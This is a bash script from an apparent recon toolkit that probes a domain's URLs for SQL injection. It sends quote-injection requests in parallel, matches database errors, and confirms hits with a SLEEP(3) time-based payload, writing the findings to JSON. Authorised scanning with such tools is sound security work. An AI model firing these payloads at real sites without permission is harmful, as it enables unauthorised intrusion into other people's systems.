#!/bin/bash
# ReconX Ultra X — SQLi Validation Pipeline (FAST)
# Usage: sqli_validator.sh <domain> <candidates_file> <output_json>
set -o pipefail
DOMAIN="$1"
CANDIDATES="$2"
OUTPUT="$3"
[[ -z "$DOMAIN" || ! -f "$CANDIDATES" ]] && exit 1
mkdir -p "$(dirname "$OUTPUT")"

TOTAL=$(wc -l < "$CANDIDATES")
echo "    ⏳ Testing $TOTAL SQLi candidates..."

# ── Step 1: Fast Error-Based Detection (parallel) ─────────────────────────
echo "    ⏳ [1/2] Error-based detection (parallel)..."
ERROR_FILE="$(dirname "$OUTPUT")/sqli_errors.txt"
> "$ERROR_FILE"

check_sqli() {
    local url="$1"
    local param
    param=$(echo "$url" | grep -oP '[?&]\K[^=]+' | head -1)
    [[ -z "$param" ]] && return
    local test_url
    test_url=$(echo "$url" | sed "s/\(${param}=\)[^&]*/\1'/g")
    local resp
    resp=$(curl -skL --max-time 5 "$test_url" 2>/dev/null)
    if echo "$resp" | grep -qiE "sql syntax|mysql_|ORA-|PostgreSQL|ODBC|SQLite|unclosed quotation|syntax error|microsoft sql|driver"; then
        echo "${url}|||${param}|||'|||error-based"
    fi
}
export -f check_sqli

sort -u "$CANDIDATES" | awk -F'?' '{if(!seen[$1]++){print}}' | head -25 | \
    xargs -P 10 -I{} bash -c 'check_sqli "{}"' >> "$ERROR_FILE" 2>/dev/null

error_count=$(wc -l < "$ERROR_FILE" 2>/dev/null)
echo "    ✅ Error-based: $error_count found"

# ── Step 2: Time-Based on error hits only ─────────────────────────────────
echo "    ⏳ [2/2] Time-based on $error_count error hits..."
TIME_FILE="$(dirname "$OUTPUT")/sqli_time.txt"
> "$TIME_FILE"

while IFS='|||' read -r url param payload technique; do
    [[ -z "$url" ]] && continue
    p=$(echo "$url" | grep -oP '[?&]\K[^=]+' | head -1)
    [[ -z "$p" ]] && continue
    test_url=$(echo "$url" | sed "s/\(${p}=\)[^&]*/\11'+AND+SLEEP(3)--+-/g")
    t1=$(date +%s)
    curl -skL --max-time 8 "$test_url" &>/dev/null
    t2=$(date +%s)
    diff=$((t2 - t1))
    if [[ "$diff" -ge 3 ]]; then
        echo "${url}|||${p}|||SLEEP(3)|||time-based" >> "$TIME_FILE"
        echo "      🔥 Time-based SQLi confirmed: $url (${diff}s delay)"
    fi
done < "$ERROR_FILE"

time_count=$(wc -l < "$TIME_FILE" 2>/dev/null)
echo "    ✅ Time-based: $time_count confirmed"

# ── Build Results JSON ────────────────────────────────────────────────────
python3 -c "
import json
results = []
try:
    with open('$ERROR_FILE') as f:
        for line in f:
            parts = line.strip().split('|||')
            if len(parts) >= 4:
                results.append({
                    'url': parts[0], 'param': parts[1], 'payload': parts[2],
                    'technique': parts[3], 'error_based': True, 'time_based': False,
                    'sqlmap_confirmed': False, 'dbms': '', 'tool': 'manual'
                })
except: pass
try:
    with open('$TIME_FILE') as f:
        for line in f:
            parts = line.strip().split('|||')
            if len(parts) >= 4:
                existing = [r for r in results if r['url'] == parts[0]]
                if existing:
                    existing[0]['time_based'] = True
                else:
                    results.append({
                        'url': parts[0], 'param': parts[1], 'payload': parts[2],
                        'technique': parts[3], 'error_based': False, 'time_based': True,
                        'sqlmap_confirmed': False, 'dbms': '', 'tool': 'manual'
                    })
except: pass
with open('$OUTPUT', 'w') as f:
    json.dump(results, f, indent=2)
print(f'    ✅ SQLi validation complete: {len(results)} findings')
" 2>/dev/null || echo "[]" > "$OUTPUT"
